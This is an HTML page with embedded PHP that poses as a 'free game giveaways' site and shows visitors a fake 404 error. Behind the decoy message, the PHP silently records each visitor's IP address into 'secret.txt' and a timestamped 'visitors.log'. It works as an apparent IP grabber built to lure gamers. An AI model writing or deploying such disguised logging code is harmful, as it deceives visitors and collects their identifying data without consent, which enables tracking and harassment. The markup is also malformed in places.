<!DOCTYPE html>

<html>

<head>

<title> Page Title </title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link href="folder/favicon.ico" rel="icon" sizes="16x16" type="image/png" />

<meta charset="UTF-8"

        <title>Easy4Free</title>

        <meta name="keywords" content="Clash Royale, PUBG Mobile, Free Fire, Stuble Guys, Fortnite & Roblox Giveaways" />

        <meta property="og:title" content="Easy4Free" />

        <meta property="og:description" content="Clash Royale, PUBG Mobile, Free Fire, Stuble Guys, Fortnite & Roblox Giveaways" />

        <meta name="description" content="Clash Royale, PUBG Mobile, Free Fire, Stuble Guys, Fortnite & Roblox Giveaways" />

        <meta name="twitter:card" content="/file.jpg">

        <meta property="og:image" content="/file.jpg">                                 

        <meta name="author" content="Shawn" />

</head>

<body>

<h1>

  404 Error

</h1>

<h3>Please try again or check your internet. Ngix 213</h3>

<?PHP

function getUserIP()

{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];

    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];

    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))

    {

        $ip = $client;

    }

    elseif(filter_var($forward, FILTER_VALIDATE_IP))

    {

        $ip = $forward;

    }

    else

    {

        $ip = $remote;

    }

    return $ip;

}

$user_ip = getUserIP();

/*echo $user_ip;*/

$file = 'secret.txt';  //this is the file to which the last visitor IP address will be written; name it your way.

$fp = fopen($file, 'a');

fwrite($fp, $user_ip);

fclose($fp);

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";

file_put_contents('visitors.log', $line . PHP_EOL, FILE_APPEND);

?>

</h1>

</b>

</center>

</body>

<div id="log"></div>

</html>
